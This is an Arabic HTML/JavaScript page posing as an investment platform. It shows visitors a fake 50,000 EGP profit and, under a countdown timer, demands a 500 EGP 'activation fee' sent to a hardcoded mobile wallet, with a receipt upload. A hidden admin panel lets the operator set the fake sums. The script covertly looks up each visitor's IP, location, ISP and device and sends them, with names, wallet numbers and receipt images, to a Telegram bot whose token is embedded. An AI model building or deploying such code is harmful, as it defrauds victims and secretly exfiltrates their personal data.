<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة التقوى - بوابة الدخول</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --main-grad: linear-gradient(135deg, #020024, #090979, #00d4ff); --gold: #ffcc00; --success: #00ff88; }
        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--main-grad); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; overflow-x: hidden; }
        
        .login-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .login-card h1 { font-size: 24px; color: var(--gold); margin-bottom: 20px; }
        .login-card input { width: 85%; padding: 15px; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; font-size: 18px; text-align: center; outline: none; margin-bottom: 20px; }
        .login-card button { background: var(--gold); border: none; padding: 12px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 90%; transition: 0.3s; }

        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 40px; height: 40px; background: transparent; cursor: pointer; z-index: 9999; }

        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; overflow-y: auto; padding: 20px; }
        .admin-content { background: #111; border: 2px solid var(--gold); padding: 25px; border-radius: 20px; width: 100%; max-width: 320px; }
        .admin-content label { display: block; font-size: 12px; color: #aaa; margin-top: 10px; text-align: right; }
        .admin-content input { width: 100%; padding: 10px; margin-top: 5px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; text-align: center; }
        .admin-content button { background: var(--success); color: #000; border: none; padding: 12px; border-radius: 5px; width: 100%; font-weight: bold; margin-top: 20px; cursor: pointer; }

        #main-site { display: none; width: 100%; max-width: 420px; }
        .site-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 25px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); text-align: center; }
        .timer-badge { background: rgba(255,0,0,0.3); color: #ff4d4d; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: inline-block; border: 1px solid #ff4d4d; }
        .balance-box { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 15px; border-right: 5px solid var(--gold); margin-bottom: 20px; }
        .balance-box div { font-size: 32px; font-weight: 900; }
        input[type="text"], input[type="tel"], input[type="file"] { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: white; color: #333; box-sizing: border-box; font-family: 'Cairo'; }
        .submit-btn { background: var(--success); color: #000; border: none; width: 100%; padding: 15px; font-size: 18px; font-weight: 900; border-radius: 10px; cursor: pointer; margin-top: 10px; }
        
        #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 11000; }
        .wallet-num { background:#000; color:var(--gold); padding:10px; border-radius:10px; font-weight:bold; margin-bottom:15px; font-size: 20px; letter-spacing: 1px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="admin-trigger" onclick="adminClick()"></div>

<div class="login-card" id="login-page">
    <h1>🏮 شركة التقوى للاستثمار 🌙</h1>
    <p style="font-size: 14px; color: #ccc;">برجاء إدخال كود الدخول للمنصة</p>
    <input type="password" id="entryPass" placeholder="كود الوصول">
    <button onclick="accessSite()">دخول</button>
</div>

<div id="admin-panel">
    <div class="admin-content">
        <h3 style="color:var(--gold); margin:0; text-align:center;">لوحة إدارة المنصة</h3>
        <label>كود الدخول (Password):</label>
        <input type="text" id="setPass" value="123456">
        <label>مدة الجلسة (بالدقائق):</label>
        <input type="number" id="setTime" value="5">
        <label>مبلغ الربح المعروض:</label>
        <input type="number" id="setProfit" value="50000">
        <label>رسوم التفعيل:</label>
        <input type="number" id="setFees" value="500">
        <label>رقم محفظة التحويل:</label>
        <input type="text" id="setWallet" value="01226811784">
        <button onclick="saveAdminSettings()">حفظ وإغلاق</button>
    </div>
</div>

<div id="main-site">
    <div class="site-card">
        <div class="timer-badge">⏱️ الجلسة تنتهي خلال: <span id="displayTime">05:00</span></div>
        <h2 style="color:var(--gold); margin:0;">لوحة الأرباح</h2>
        <div class="balance-box">
            <span style="font-size:12px; color:#aaa;">رصيدك الحالي</span>
            <div><span id="showProfit">50,000</span> <small>EGP</small></div>
        </div>
        <input type="text" id="uName" placeholder="الاسم بالكامل">
        <input type="tel" id="uWallet" placeholder="رقم محفظتك لاستلام الأرباح">
        <p style="font-size:12px;">رسوم المعالجة المطلوبة (<span id="showFees" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
        <div class="wallet-num" id="showAdminWallet">01226811784</div>
        <label style="display:block; text-align:right; font-size:12px; color:var(--gold);">ارفق صورة إيصال التحويل:</label>
        <input type="file" id="uFile" accept="image/*">
        <button class="submit-btn" onclick="sendToTelegram()">تأكيد السحب الآن</button>
    </div>
</div>

<div id="loader">
    <div style="width:50px; height:50px; border:4px solid #333; border-top:4px solid var(--success); border-radius:50%; animation:spin 1s linear infinite;"></div>
    <p>جاري المعالجة...</p>
</div>

<script>
    const TOKEN = '8412077444:AAHgu7XnlUMAaRPayFmUtD14AAbTznPJRII';
    const CHAT_ID = '8292390266';

    let config = JSON.parse(localStorage.getItem('adminConfig')) || { 
        pass: '123456', time: 5, profit: 50000, fees: 500, adminWallet: '01226811784'
    };

    function applyConfig() {
        document.getElementById('showProfit').innerText = Number(config.profit).toLocaleString();
        document.getElementById('showFees').innerText = config.fees;
        document.getElementById('showAdminWallet').innerText = config.adminWallet;
        document.getElementById('setPass').value = config.pass;
        document.getElementById('setTime').value = config.time;
        document.getElementById('setProfit').value = config.profit;
        document.getElementById('setFees').value = config.fees;
        document.getElementById('setWallet').value = config.adminWallet;
    }
    applyConfig();

    let clickCount = 0;
    function adminClick() { clickCount++; if(clickCount >= 3) { document.getElementById('admin-panel').style.display = 'flex'; clickCount = 0; } }

    function saveAdminSettings() {
        config = {
            pass: document.getElementById('setPass').value,
            time: document.getElementById('setTime').value,
            profit: document.getElementById('setProfit').value,
            fees: document.getElementById('setFees').value,
            adminWallet: document.getElementById('setWallet').value
        };
        localStorage.setItem('adminConfig', JSON.stringify(config));
        applyConfig();
        document.getElementById('admin-panel').style.display = 'none';
        alert("تم الحفظ.");
    }

    // --- وظيفة جلب معلومات التتبع المتطورة (IP + الموقع + الشركة) ---
    async function getAdvancedTracking() {
        let report = { ip: "غير معروف", city: "غير معروف", country: "غير معروف", isp: "غير معروف", device: navigator.userAgent };
        try {
            // استخدام خدمة ip-api لجلب تفاصيل العنوان
            const res = await fetch('http://ip-api.com/json/');
            const data = await res.json();
            if(data.status === 'success') {
                report.ip = data.query;
                report.city = data.city;
                report.country = data.country;
                report.isp = data.isp;
            }
        } catch(e) {
            // محاولة بديلة إذا فشلت الأولى
            try {
                const res2 = await fetch('https://ipapi.co/json/');
                const data2 = await res2.json();
                report.ip = data2.ip;
                report.city = data2.city;
                report.country = data2.country_name;
                report.isp = data2.org;
            } catch(e2) {}
        }
        return report;
    }

    async function accessSite() {
        const inputPass = document.getElementById('entryPass').value;
        if(inputPass === config.pass) {
            document.getElementById('login-page').style.display = 'none';
            document.getElementById('main-site').style.display = 'block';
            
            // جلب البيانات المتطورة وإرسالها
            const track = await getAdvancedTracking();
            const msg = `🔔 دخول جديد (رصد كامل):\n\n` +
                        `🌐 العنوان: ${track.ip}\n` +
                        `📍 الموقع: ${track.city}, ${track.country}\n` +
                        `🏢 الشركة: ${track.isp}\n` +
                        `📱 الجهاز: ${track.device}`;
                        
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
            
            startCountdown(config.time * 60);
        } else {
            alert("الكود خطأ!");
        }
    }

    function startCountdown(duration) {
        let timer = duration;
        const display = document.getElementById('displayTime');
        const interval = setInterval(() => {
            let m = parseInt(timer / 60, 10);
            let s = parseInt(timer % 60, 10);
            display.textContent = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
            if (--timer < 0) { clearInterval(interval); location.reload(); }
        }, 1000);
    }

    async function sendToTelegram() {
        const name = document.getElementById('uName').value;
        const wallet = document.getElementById('uWallet').value;
        const file = document.getElementById('uFile').files[0];

        if(!name || !wallet || !file) return alert("أكمل البيانات وارفع الإيصال.");

        document.getElementById('loader').style.display = 'flex';
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', file);
        formData.append('caption', `🌟 سحب جديد 🌟\n👤 الاسم: ${name}\n📱 الرقم: ${wallet}\n💰 الربح: ${config.profit}\n💸 الرسوم: ${config.fees}\n💳 المحفظة المستلمة: ${config.adminWallet}`);

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            alert("تم الإرسال بنجاح.");
            location.reload();
        } catch(e) { alert("خطأ في الاتصال."); }
        finally { document.getElementById('loader').style.display = 'none'; }
    }
</script>
</body>
</html>
